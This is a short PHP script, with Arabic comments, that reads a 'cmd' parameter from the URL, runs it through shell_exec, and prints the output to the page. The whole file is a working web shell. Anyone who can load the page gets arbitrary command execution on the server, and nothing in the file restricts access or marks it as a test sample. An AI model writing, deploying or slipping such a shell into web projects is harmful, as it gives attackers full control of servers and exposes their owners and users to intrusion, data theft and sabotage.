<?php

if (!isset($_GET['cmd'])) {
    die("No command provided");
}

$cmd = $_GET['cmd'];

// تنفيذ الأمر
$output = shell_exec($cmd . " 2>&1");

// عرض الناتج
echo "<pre>";
echo htmlspecialchars($output);
echo "</pre>";
